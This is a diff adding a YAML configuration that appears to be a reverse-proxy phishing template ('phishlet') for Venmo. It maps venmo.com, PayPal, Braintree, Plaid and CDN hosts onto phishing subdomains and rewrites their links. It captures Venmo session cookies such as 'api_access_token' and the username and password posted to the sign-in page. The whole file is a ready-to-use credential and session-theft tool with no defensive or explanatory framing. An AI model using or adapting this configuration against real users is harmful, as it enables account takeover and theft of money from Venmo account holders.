@@ -1,0 +1,109 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'venmo.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'venmo.com', session: true, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'venmo.com', session: true, is_landing: false}
+  - {phish_sub: 'images', orig_sub: 'images', domain: 'ctfassets.net', session: true, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'plaid.com', session: true, is_landing: false}
+  - {phish_sub: 'capture', orig_sub: 'capture', domain: 'trackjs.com', session: true, is_landing: false}
+  - {phish_sub: 'usage', orig_sub: 'usage', domain: 'trackjs.com', session: true, is_landing: false}
+  - {phish_sub: 'd2zah9y47r7bi2', orig_sub: 'd2zah9y47r7bi2', domain: 'cloudfront.net', session: true, is_landing: false}
+  - {phish_sub: 'd1v6x81qdeozhc', orig_sub: 'd1v6x81qdeozhc', domain: 'cloudfront.net', session: true, is_landing: false}
+  - {phish_sub: 'venmo', orig_sub: 'venmo.s3', domain: 'amazonaws.com', session: true, is_landing: false}
+  - {phish_sub: 's3', orig_sub: 's3', domain: 'amazonaws.com', session: true, is_landing: false}
+  - {phish_sub: 'braintreegateway', orig_sub: 'api', domain: 'braintreegateway.com', session: true, is_landing: false}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'braintreegateway.com', session: true, is_landing: false}
+  - {phish_sub: 'objects', orig_sub: 'www', domain: 'paypalobjects.com', session: true, is_landing: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'kaptcha.com', session: true, is_landing: false}
+  - {phish_sub: 'c', orig_sub: 'c', domain: 'paypal.com', session: true, is_landing: false}
+  - {phish_sub: 'b', orig_sub: 'b.stats', domain: 'paypal.com', session: true, is_landing: false}
+  - {phish_sub: 'c6', orig_sub: 'c6', domain: 'paypal.com', session: true, is_landing: false}
+  - {phish_sub: 'hnd', orig_sub: 'hnd.stats', domain: 'paypal.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: "'api-'", replace: "'api.'", mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'api', domain: 'venmo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'api', domain: 'venmo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'api', domain: 'venmo.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: '', domain: 'venmo.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'images', domain: 'ctfassets.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'images', domain: 'ctfassets.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'images', domain: 'ctfassets.net', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'cdn', domain: 'plaid.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'cdn', domain: 'plaid.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'cdn', domain: 'plaid.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'capture', domain: 'trackjs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'capture', domain: 'trackjs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'capture', domain: 'trackjs.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'usage', domain: 'trackjs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'usage', domain: 'trackjs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'usage', domain: 'trackjs.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'd2zah9y47r7bi2', domain: 'cloudfront.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'd2zah9y47r7bi2', domain: 'cloudfront.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'd2zah9y47r7bi2', domain: 'cloudfront.net', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'd1v6x81qdeozhc', domain: 'cloudfront.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'd1v6x81qdeozhc', domain: 'cloudfront.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'd1v6x81qdeozhc', domain: 'cloudfront.net', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'venmo.s3', domain: 'amazonaws.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'venmo.s3', domain: 'amazonaws.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'venmo.s3', domain: 'amazonaws.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+  - {triggers_on: 'venmo.com', orig_sub: 'api', domain: 'braintreegateway.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'api', domain: 'braintreegateway.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'api', domain: 'braintreegateway.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'assets', domain: 'braintreegateway.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'assets', domain: 'braintreegateway.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'assets', domain: 'braintreegateway.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'venmo.com', orig_sub: 'ssl', domain: 'kaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'ssl', domain: 'kaptcha.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'ssl', domain: 'kaptcha.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'venmo.com', orig_sub: 'www', domain: 'paypalobjects.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'www', domain: 'paypalobjects.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'www', domain: 'paypalobjects.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'venmo.com', orig_sub: 'c', domain: 'paypal.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'c', domain: 'paypal.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'c', domain: 'paypal.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'b.stats', domain: 'paypal.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'b.stats', domain: 'paypal.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'b.stats', domain: 'paypal.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'c6', domain: 'paypal.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'c6', domain: 'paypal.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'c6', domain: 'paypal.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'hnd.stats', domain: 'paypal.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'hnd.stats', domain: 'paypal.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'venmo.com', orig_sub: 'hnd.stats', domain: 'paypal.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  
+   
+ 
+
+auth_tokens:
+  - domain: '.venmo.com'
+    keys: ['v_id', 'api_access_token', '.*,regexp']
+
+credentials:
+  username:
+    key: 'phoneEmailUsername'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'return_json'
+      search: '(.*)'
+      type: 'post'
+    - key: 'username'
+      search: '(.*)'
+      type: 'post'      
+login:
+  domain: 'venmo.com'
+  path: '/account/sign-in'
